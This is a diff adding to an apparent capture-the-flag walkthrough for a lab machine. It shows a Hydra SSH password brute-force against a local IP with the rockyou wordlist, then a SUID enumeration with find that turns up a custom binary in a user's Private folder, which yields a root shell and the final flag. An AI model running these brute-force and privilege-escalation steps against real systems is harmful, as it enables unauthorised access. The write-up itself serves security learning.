@@ -172,3 +172,76 @@ hydra  -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.121 -f -
 ```
 
 ![image](https://user-images.githubusercontent.com/5285547/130261096-40245c8f-13a2-45f2-8f0e-33c72e964c26.png)
+
+Backing up to the other users home folder (alatar) we find the user.txt flag. 
+
+![image](https://user-images.githubusercontent.com/5285547/130261234-69d0d297-c827-46f3-bbaa-77a8c8c2d18d.png)
+
+## Root
+
+Enumerating the system we end up finding some strange SUID binaries in one of the users folders. 
+
+```
+find / -perm -u=s -type f 2>/dev/null
+
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/bin/chfn
+/usr/bin/mount
+/usr/bin/gpasswd
+/usr/bin/su
+/usr/bin/umount
+/usr/bin/pkexec
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/at
+/usr/bin/sudo
+/usr/bin/fusermount
+/home/alatar/Private/shell_testv1.0
+/snap/snapd/12057/usr/lib/snapd/snap-confine
+/snap/snapd/12704/usr/lib/snapd/snap-confine
+/snap/core18/2066/bin/mount
+/snap/core18/2066/bin/ping
+/snap/core18/2066/bin/su
+/snap/core18/2066/bin/umount
+/snap/core18/2066/usr/bin/chfn
+/snap/core18/2066/usr/bin/chsh
+/snap/core18/2066/usr/bin/gpasswd
+/snap/core18/2066/usr/bin/newgrp
+/snap/core18/2066/usr/bin/passwd
+/snap/core18/2066/usr/bin/sudo
+/snap/core18/2066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core18/2066/usr/lib/openssh/ssh-keysign
+/snap/core18/2128/bin/mount
+/snap/core18/2128/bin/ping
+/snap/core18/2128/bin/su
+/snap/core18/2128/bin/umount
+/snap/core18/2128/usr/bin/chfn
+/snap/core18/2128/usr/bin/chsh
+/snap/core18/2128/usr/bin/gpasswd
+/snap/core18/2128/usr/bin/newgrp
+/snap/core18/2128/usr/bin/passwd
+/snap/core18/2128/usr/bin/sudo
+/snap/core18/2128/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core18/2128/usr/lib/openssh/ssh-keysign
+```
+
+This one sparks my intrest. 
+
+```
+/home/alatar/Private/shell_testv1.0
+```
+
+We can see this has the SUID bit set, lets run it to see what happens. 
+
+![image](https://user-images.githubusercontent.com/5285547/130261664-b8e4d8fa-0206-4f2c-94b5-83d2f9166586.png)
+
+![image](https://user-images.githubusercontent.com/5285547/130261781-07590fbc-65dc-471a-aa5d-05be05ec5619.png)
+
+We instantly get root! and the last flag 
+
+
